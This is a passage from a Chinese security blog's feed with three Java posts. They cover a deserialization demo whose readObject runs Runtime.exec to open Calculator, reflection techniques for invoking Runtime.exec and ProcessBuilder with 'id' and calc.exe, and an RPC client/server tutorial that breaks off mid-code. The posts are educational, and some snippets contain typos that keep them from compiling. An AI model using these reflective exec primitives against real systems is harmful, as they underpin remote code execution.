class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行打开计算器程序命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open /System/Applications/Calculator.app/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次我们自己写了一个 class 来进行对象的序列与反序列化。我们看到，MyObject 类有一个公有属性 name ，myObj 实例化后将 <a href="http://myObj.name">myObj.name</a> 赋值为了 “hi” ，然后序列化写入文件 object：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313163550.png" alt=""></p><p>然后读取 object 反序列化时：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313163209.png" alt=""></p><p>我们注意到 MyObject 类实现了<code>Serializable</code>接口，并且重写了<code>readObject()</code>函数。这里的 readObject() 执行了<code>Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app/&quot;)</code>，而 readObject() 方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回，readObject() 是可以重写的，可以定制反序列化的一些行为。</p><h2 id="0x02-反序列化漏洞分析">0x02 反序列化漏洞分析</h2><p>看完上一章节你可能会说不会有人这么写 readObject() ，当然不会，但是实际也不会太差。</p><p>这里就用ysoserial工具给出的各种反序列化漏洞来分析，Step By Step：</p><p>ysoserial URLDNS详细分析</p><p>ysoserial CommonsCollections1详细分析</p><p>ysoserial CommonsCollections2详细分析</p><p>ysoserial CommonsCollections3详细分析</p><p>ysoserial CommonsCollections4详细分析</p><p>ysoserial CommonsCollections5详细分析</p><p>ysoserial CommonsCollections6详细分析</p><p>ysoserial CommonsCollections7详细分析</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java安全学习之反序列化&quot;&gt;Java安全学习之反序列化&lt;/h1&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;P神—代码审计—Java安全漫谈-07.反序列化篇(1)&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://paper.seebug.org/312/&quot;&gt;https://
      
    
    </summary>
    
    
      <category term="Web安全基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="Java" scheme="http://ca0y1h.top/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java安全学习之反射</title>
    <link href="http://ca0y1h.top/Java/javasec/1.Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84/"/>
    <id>http://ca0y1h.top/Java/javasec/1.Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84/</id>
    <published>2021-03-11T06:35:53.000Z</published>
    <updated>2021-03-11T06:39:46.473Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java安全学习之反射">Java安全学习之反射</h1><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a></p><p><a href="https://xz.aliyun.com/t/7029">https://xz.aliyun.com/t/7029</a></p><p>P神-java安全漫谈-反射机制1（知识星球-代码审计）<br>P神-java安全漫谈-反射机制2（知识星球-代码审计）<br>P神-java安全漫谈-反射机制3（知识星球-代码审计）</p><h2 id="0x01-反射概念">0x01 反射概念</h2><p>反射的核心是JVM在运行状态的时候才动态加载类，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的方法/访问属性。这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p><blockquote><p>⼀段代码，改变其中的变量，将会导致 这段代码产⽣功能性的变化，称之为动态特性。</p></blockquote><h2 id="0x02-java反射机制流程图">0x02 java反射机制流程图</h2><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210309194221.png" alt=""></p><p>比如我们创建了一个类文件，经过javac编译之后，就会形成class文件，同时jvm内存会查找生成的class文件读入内存和经过ClassLoader加载，同时会自动创建生成一个Class对象，里面拥有其获取成员变量Field，成员方法Method和构造方法Constructor等方法。最后就是我们平时new创建对象。</p><p>反射机制本身就是获取一个类的Class对象，然后在用Class对象中的获取成员变量Field，成员方法Method和构造方法Constructor等方法，再去动态获取一个类或者调用一个类的属性，变量，构造方法等方式。</p><h2 id="0x03-反射常见使用方法">0x03 反射常见使用方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Class clazz = Class.forName(className);    </span><br><span class="line">    clazz.getMethod(methodName).invoke(clazz.newInstance()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上⾯的例⼦中，演示了⼏个在反射⾥极为重要的⽅法：</p><ul><li><p>获取类的⽅法： forName</p></li><li><p>实例化类对象的⽅法： newInstance</p></li><li><p>获取函数的⽅法： getMethod</p></li><li><p>执⾏函数的⽅法： invoke</p></li></ul><p>基本上，这⼏个⽅法包揽了Java安全⾥各种和反射有关的Payload，首先来一个个的解释。</p><h3 id="forName">forName</h3><p>获取”类“(<strong>java.lang.Class</strong>)的对象有三种方法：</p><ul><li><strong>obj.getClass()</strong> 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过obj.getClass() 来获取它的类；</li><li><strong>Test.class</strong> 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。这个⽅法其实不属于反射。</li><li><strong>Class.forName</strong> 如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取</li></ul><p>forName有两个函数重载：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; forName(String name)</span><br><span class="line"><span class="comment">//name:class名称</span></span><br><span class="line">Class&lt;?&gt; forName(String name, **<span class="keyword">boolean</span>** initialize, ClassLoader loader)</span><br><span class="line"><span class="comment">//name:class名称</span></span><br><span class="line"><span class="comment">//initialize：是否进行“类初始化”</span></span><br><span class="line"><span class="comment">//loader：加载器</span></span><br></pre></td></tr></table></figure><p>类初始化和类实例化的区别，先来看如下这个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainPrint</span> </span>&#123;</span><br><span class="line">    <span class="comment">//初始块</span></span><br><span class="line">    &#123;        </span><br><span class="line">        System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span class="keyword">this</span>.getClass());    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//静态初始块</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);    </span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrainPrint</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="keyword">this</span>.getClass());</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分别使用forName和实例化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    Class.forName(<span class="string">&quot;TrainPrint&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Static initial class TrainPrint</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">   TrainPrint test= <span class="keyword">new</span> TrainPrint();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Static initial class TrainPrint</span></span><br><span class="line"><span class="comment">// Empty block initial class TrainPrint</span></span><br><span class="line"><span class="comment">// Initial class TrainPrint</span></span><br></pre></td></tr></table></figure><p>类的实例化：<code>静态初始块</code>-&gt;<code>初始块</code>-&gt;<code>构造函数</code><br>类的初始化：<code>静态初始块</code></p><h3 id="getMethod">getMethod</h3><p>getMethod 的作用是通过反射获取一个类的某个特定的<strong>公有</strong>方法。<br>而Java中支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，我们需要传给他你需要获取的函数的参数类型列表，如下：<br><code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class)</code></p><h3 id="invoke">invoke</h3><p>invoke方法位于Method类下，其的作用是传入参数，执行方法，它的第一个参数是执行method的对象：</p><ul><li>如果这个方法是一个普通方法，那么第一个参数是类对象</li><li>如果这个方法是一个静态方法，那么第一个参数是类（之后会提到，这里其实不用那么死板，这个）<br>它接下来的参数才是需要传入的参数。</li></ul><p>以反射执行<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;);</code>为例：</p><p>最开始的想法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure><p>但是会执行报错，意思大概是Runtime的类对象不能通过newInstance()来获取对象（class.newInstance等于new class）,是因为Runtime的类构造函数是一个private构造函数，只能通过getRuntime方法返回一个对象。</p><blockquote><p>之所以构造函数是private属性，是因为Runtime遵循单例模式，不允许多次实例化，类初始化的时候会执行一次构造函数，只能通过 Runtime.getRuntime() 来获取到Runtime对象。</p></blockquote><p>那么很自然的第二个想法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>); </span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz), <span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure><p>分开来写会更清楚：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Method execMethod = clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">Method getRuntimeMethod = clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">Object runtime = getRuntimeMethod.invoke(clazz);</span><br><span class="line">exec = execMethod.invoke(runtime, <span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure><p>以上我们就完成了通过类内置的静态方法获取类的实例，进一步调用一个public方法。<br>但是假如一个类没有无参构造方法（即不能class.newInstance()），也没有单例模式（只存在一个实例）的静态方法（即不能像getRuntime一样获取实例），那我们该如何实例化这个类呢？</p><h3 id="指定的构造方法生成类的实例">指定的构造方法生成类的实例</h3><p>假如我们这次使用ProcessBuilder来执行本地命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; paramList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">paramList.add(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder(paramList);</span><br><span class="line">pb.start();</span><br></pre></td></tr></table></figure><p>可见，其构造函数是写入了一个字符串，不是无参构造方法，接下来我们会一步步进行转化。</p><p><code>getConstructor()</code>函数可以选定指定接口格式的构造函数(由于构造函数也可以根据参数来进行重载)，即：<code>getConstructor(参数类型)</code></p><p>选定后我们可以通过newInstance(),并传入构造函数的参数执行构造函数，即<code>newInstance(传入的构造函数参数)</code>。</p><p>ProcessBuilder有两个构造函数：</p><ul><li><code>public ProcessBuilder(List&lt;String&gt; command)</code></li><li><code>public ProcessBuilder(String... command)</code>(此处，String<code>...</code>这种语法表示String参数数量是可变的，与String[]一样)</li></ul><p>分别执行构造方法获取实例的语句如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>).getConstructor(<span class="string">&quot;String.class&quot;</span>).newInstance(<span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>).getConstructor(<span class="string">&quot;List.class&quot;</span>).newInstance(Arrays.asList(<span class="string">&quot;id&quot;</span>));</span><br></pre></td></tr></table></figure><p>执行完构造方法获取实例之后，其实可以通过类型强制转化，进而执行start()函数来执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(<span class="string">&quot;List.class&quot;</span>).newInstance(Arrays.asList(<span class="string">&quot;id&quot;</span>))).start();</span><br></pre></td></tr></table></figure><p>但实际情况下并不一定可以这样利用，所以继续使用反射机制调用start函数,start函数不是一个静态函数,需要传入类的实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(<span class="string">&quot;List.class&quot;</span>).newInstance(Arrary.asList(<span class="string">&quot;id&quot;</span>)));</span><br></pre></td></tr></table></figure><h3 id="执行私有方法">执行私有方法</h3><p>以上都是方法或构造方法是public函数，用的都是getMethod、getConstructor，接下来需要使用getDeclaredMethod、getDeclaredConstructor：</p><ul><li>getMethod等方法获取的是当前类中所有公共方法，包括从父类继承的方法</li><li>getDeclared等方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了</li></ul><p>之前说到Runtime的构造方式是一个私有方法，从而不能直接调用，那么接下来我们来调用Runtime的构造方法来获取一个实例来执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Constructor cons = clazz.getDeclaredConstructor();</span><br><span class="line">cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(cons.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure><p>在获取到私有方法后，通过<code>setAccessible(true)</code>可以打破私有方法访问限制，从而进行调用。</p><blockquote><p>待填坑…</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java安全学习之反射&quot;&gt;Java安全学习之反射&lt;/h1&gt;
&lt;p&gt;参考文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/9117&quot;&gt;https://xz.aliyun.com/t/9117&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href
      
    
    </summary>
    
    
      <category term="Web安全基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="Java" scheme="http://ca0y1h.top/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java基础学习之演练过程</title>
    <link href="http://ca0y1h.top/Java/code/8.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%BC%94%E7%BB%83%E8%BF%87%E7%A8%8B/"/>
    <id>http://ca0y1h.top/Java/code/8.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%BC%94%E7%BB%83%E8%BF%87%E7%A8%8B/</id>
    <published>2021-03-11T06:35:40.000Z</published>
    <updated>2021-03-11T06:38:42.707Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java基础学习之RPC演进过程">Java基础学习之RPC演进过程</h1><p>参考：</p><p><a href="https://www.bilibili.com/video/BV1zE41147Zq?from=search&amp;seid=13740626242455157002">https://www.bilibili.com/video/BV1zE41147Zq?from=search&amp;seid=13740626242455157002</a></p><p>首先定义一个User类，只有两个字段：<code>id</code>和<code>name</code>，并且继承序列化<code>Serilizable</code>接口。</p><p>User.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.common;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(Integer id, String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着定义一个<code>IUserService</code>接口类，其中只有一个方法<code>findUserById</code>，通过<code>id</code>字段返回一个User对象。</p><p>IUserService.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.common;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IUserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findUserById</span><span class="params">(Integer id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第一个版本">第一个版本</h2><p>首先来看第一个实现RPC的最原始版本。在上面common包中声明了<code>IUserService</code>接口，这里实现这个接口，简单起见，<code>name</code>字段为一个固定值，<code>id</code>字段通过传参传进来。</p><p>UserServiceImpl.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">IUserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findUserById</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User(id, <span class="string">&quot;ca01h&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着实现服务端代码，在这个例子中，服务端代码的核心就是接收客户端传过来的<code>id</code>参数，然后调用<code>getUserById</code>函数返回一个User对象给客户端，但是由于User对象并不是一个基础类型，我们也没有定义他的序列化和反序列化的方式，所以在第一个版本中直接返回<code>id</code>和<code>name</code>两个参数。</p><p>Server.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> running = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ServerSocket ss = <span class="keyword">new</span> ServerSocket(<span class="number">8888</span>);</span><br><span class="line">        <span class="keyword">while</span> (running) &#123;</span><br><span class="line">            Socket s = ss.accept();</span><br><span class="line">            process(s);</span><br><span class="line">            s.close();</span><br><span class="line">        &#125;</span><br><span class="line">        ss.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(Socket s)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        InputStream in = s.getInputStream();</span><br><span class="line">        OutputStream out = s.getOutputStream();</span><br><span class="line">        DataInputStream dis = <span class="keyword">new</span> DataInputStream(in);</span><br><span class="line">        DataOutputStream dos = <span class="keyword">new</span> DataOutputStream(out);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> id = dis.readInt();</span><br><span class="line">        IUserService service = <span class="keyword">new</span> UserServiceImpl();</span><br><span class="line">        User user = service.findUserById(id);</span><br><span class="line">        dos.writeInt(user.getId());</span><br><span class="line">        dos.writeUTF(user.getName());</span><br><span class="line">        dos.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client.java</p><p>最后完成客户端代码，客户端代码首先连接服务端开启的端口，然后再向服务端传入<code>id</code>参数，最后用阻塞的方式读取服务端传回来的结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.DataInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.DataOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Socket s = <span class="keyword">new</span> Socket(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>);</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        DataOutputStream dos = <span class="keyword">new</span> DataOutputStream(baos);</span><br><span class="line">        dos.writeInt(<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        